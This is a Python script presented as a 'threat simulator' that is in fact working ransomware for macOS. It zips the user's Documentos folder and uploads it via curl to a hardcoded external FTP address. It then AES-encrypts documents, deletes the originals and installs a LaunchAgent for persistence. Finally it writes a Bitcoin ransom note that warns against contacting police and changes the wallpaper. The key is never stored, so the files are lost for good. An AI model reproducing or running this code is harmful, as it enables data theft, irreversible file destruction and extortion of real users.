import os
import zipfile
import subprocess
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import random
import string
import requests
import importlib.util

class ThreatSimulator:
    def __init__(self):
        self.decryption_key = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(20, 30)))
        self.home_directory = os.path.expanduser("~")
        self.documentos_folder = os.path.join(self.home_directory, 'Documentos')
        self.directories_to_encrypt = [self.documentos_folder]
        self.extension = ".bsp"

    def generate_key(self, password: bytes) -> bytes:
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes

        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        return kdf.derive(password), salt

    def encrypt_file(self, file_path, extension):
        key, salt = self.generate_key(self.decryption_key.encode())
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        with open(file_path, 'rb') as f_in:
            data = f_in.read()

        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data) + padder.finalize()

        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        encrypted_file_path = os.path.splitext(file_path)[0] + extension
        with open(encrypted_file_path, 'wb') as f_out:
            f_out.write(salt)
            f_out.write(iv)
            f_out.write(encrypted_data)

        os.remove(file_path)

    def encrypt_directory(self, directory, extension):
        target_extensions = ('.docx', '.xlsx', '.pdf', '.txt')
        for root, _, files in os.walk(directory):
            for file in files:
                if file.lower().endswith(target_extensions):
                    file_path = os.path.join(root, file)
                    self.encrypt_file(file_path, extension)

    def create_threat_note(self):
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        if not os.path.exists(desktop_path):
            os.makedirs(desktop_path)
        ransom_note_path = os.path.join(desktop_path, "README_NOTE.txt")
        with open(ransom_note_path, 'w') as f:
            f.write("Attention!\n\n")
            f.write("Your organization's security has been breached.\n")
            f.write("We have exploited several vulnerabilities in your network infrastructure and gained unauthorized access to sensitive data.\n")
            f.write("Our demands are clear:\n")
            f.write("To prevent further damage and secure the release of your data, you must pay a ransom of $10,000 in Bitcoin to the following wallet address:\n")
            f.write("Bitcoin Wallet: 1abcdefgHijKLMnopqrstuvWXYZ\n\n")
            f.write("Once the payment is confirmed, you will receive further instructions on how to regain control of your systems.\n")
            f.write("Attempting to recover the data or alerting law enforcement will result in permanent data loss.\n")
            f.write("Remember, we are watching.\n\n")
            f.write("For assistance or to initiate payment, contact us at:\n")
            f.write("Email: binaryninja@protonmail.com\n")

    def add_launchd_persistence(self):
        try:
            plist_dir = os.path.join(os.path.expanduser("~/Library/LaunchAgents"))
            if not os.path.exists(plist_dir):
                os.makedirs(plist_dir)
            plist_path = os.path.join(plist_dir, "com.threat.plist")
            script_path = os.path.abspath(__file__)
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.threat</string>
    <key>ProgramArguments</key>
    <array>
        <string>ARTV</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            subprocess.run(["launchctl", "load", plist_path], check=True)
        except Exception:
            pass

    def set_wallpaper_from_url(self, url):
        response = requests.get(url)
        if response.status_code == 200:
            temp_path = '/tmp/wallpaper.png'
            with open(temp_path, 'wb') as f:
                f.write(response.content)

            script = f'''
                tell application "Finder"
                    set desktop picture to POSIX file "{temp_path}"
                end tell
            '''
            subprocess.run(['osascript', '-e', script])

    def check_and_install_requests():
        try:
            importlib.import_module('requests')
        except ImportError:
            try:
                subprocess.run(['pip3', 'install', 'requests'])
                import requests
            except Exception:
                pass
    check_and_install_requests = staticmethod(check_and_install_requests)

    def zip_files(self, documentos_folder):
        from datetime import datetime

        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_filename = f"data_{current_time}.zip"
        zip_filepath = os.path.join(documentos_folder, zip_filename)

        total_size_before = sum(
            os.path.getsize(os.path.join(documentos_folder, f))
            for f in os.listdir(documentos_folder)
            if os.path.isfile(os.path.join(documentos_folder, f)) and not f.endswith('.zip')
        )

        with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in os.listdir(documentos_folder):
                file_path = os.path.join(documentos_folder, file)
                if (
                    os.path.isfile(file_path)
                    and not file.startswith('.')
                    and not os.path.islink(file_path)
                    and not file.endswith('.zip')
                ):
                    zipf.write(file_path, arcname=file)

        return zip_filepath

    def upload_via_ftp(self, file_path):
        ftp_url = "ftp://64.227.23.182/upload/"
        username = "anonymous"
        password = ""

        command = f"curl -T {file_path} {ftp_url} -u {username}:{password}"
        subprocess.run(command, shell=True)

        if os.path.exists(file_path):
            os.remove(file_path)

    def simulate_attack(self):
        zip_file_path = self.zip_files(self.documentos_folder)
        self.upload_via_ftp(zip_file_path)
        self.encrypt_directory(self.documentos_folder, self.extension)
        self.add_launchd_persistence()
        self.create_threat_note()
        self.set_wallpaper_from_url("https://academy.avast.com/hs-fs/hubfs/New_Avast_Academy/the_essential_guide_to_ransomware_academy_refresh_2/img-01.png?width=788&height=409&name=img-01.png")

def main():
    threat_simulator = ThreatSimulator()
    threat_simulator.simulate_attack()

if __name__ == "__main__":
    main()